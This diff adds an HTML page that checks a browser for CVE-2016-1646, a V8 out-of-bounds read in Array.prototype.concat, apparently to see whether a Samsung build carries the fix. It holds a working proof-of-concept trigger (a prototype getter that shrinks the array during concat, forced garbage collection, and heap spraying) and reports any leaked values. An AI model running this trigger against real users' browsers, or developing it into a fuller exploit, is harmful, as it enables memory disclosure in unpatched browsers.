@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CVE-2016-1646 check</title>
+<style>
+  body { background:#111; color:#eee; font-family:sans-serif; margin:40px; }
+  #verdict { font-size:64px; font-weight:bold; line-height:1.15; }
+  #detail { font-size:22px; margin-top:24px; white-space:pre-wrap; }
+  .vuln { color:#ff5252; } .clean { color:#69f0ae; } .err { color:#ffd740; }
+</style>
+</head>
+<body>
+<div id="verdict">RUNNING...</div>
+<div id="detail"></div>
+<script>
+var verdictEl = document.getElementById('verdict');
+var detailEl = document.getElementById('detail');
+var lines = [];
+function note(s) { lines.push(s); detailEl.textContent = lines.join('\n'); }
+window.onerror = function (msg) {
+  verdictEl.textContent = 'BROWSER ERRORED';
+  verdictEl.className = 'err';
+  note('window.onerror: ' + msg);
+};
+
+note('UA: ' + navigator.userAgent);
+note('Test: CVE-2016-1646 (V8 Array.prototype.concat), 30 rounds.');
+
+function gc() {
+  for (var i = 0; i < ((1024 * 1024) / 0x10); i++) { var a = new String(); }
+}
+
+var ROUNDS = 30;
+var anomalies = 0;
+var firstAnomaly = '';
+
+for (var round = 0; round < ROUNDS; round++) {
+  // Groom: a distinctive 0x20000-byte ArrayBuffer the OOB sweep may read.
+  var ab = new ArrayBuffer(0x20000);
+  var spray = [];
+  for (var s = 0; s < 64; s++) spray.push(new ArrayBuffer(0x20000));
+
+  var array = new Array(10);
+  array[0] = 1.1;
+  array[2] = 2.1;
+  array[3] = 3.1;
+
+  var proto = {};
+  array.__proto__ = proto;
+  Object.defineProperty(proto, 1, {
+    get: function () {
+      array.length = 1;
+      gc();
+      return 'value from proto';
+    },
+    set: function (v) {}
+  });
+
+  var result;
+  try {
+    result = Array.prototype.concat.call(array);
+  } catch (e) {
+    note('round ' + round + ': concat threw ' + e);
+    continue;
+  }
+
+  // Legitimate elements after the trigger: 1.1, "value from proto", 2.1, 3.1,
+  // everything else must be holes. Anything else is out-of-bounds data.
+  for (var idx = 0; idx < result.length; idx++) {
+    if (!(idx in result)) continue;
+    var v = result[idx];
+    var ok = (v === 1.1 || v === 2.1 || v === 3.1 || v === 'value from proto');
+    if (!ok) {
+      anomalies++;
+      if (!firstAnomaly) {
+        firstAnomaly = 'round ' + round + ' index ' + idx + ' = ' +
+          (typeof v) + ' ' + String(v).slice(0, 60);
+      }
+    }
+  }
+}
+
+if (anomalies > 0) {
+  verdictEl.textContent = 'VULNERABLE';
+  verdictEl.className = 'vuln';
+  note('Anomalous elements in concat result: ' + anomalies);
+  note('First: ' + firstAnomaly);
+  note('The CVE-2016-1646 out-of-bounds read fired on this build.');
+} else {
+  verdictEl.textContent = 'NOT REPRODUCED';
+  verdictEl.className = 'clean';
+  note('All ' + ROUNDS + ' rounds returned only legitimate elements.');
+  note('Either Samsung backported the fix, or the trigger did not line up');
+  note('on this build. A negative here is suggestive, not proof.');
+}
+</script>
+</body>
+</html>
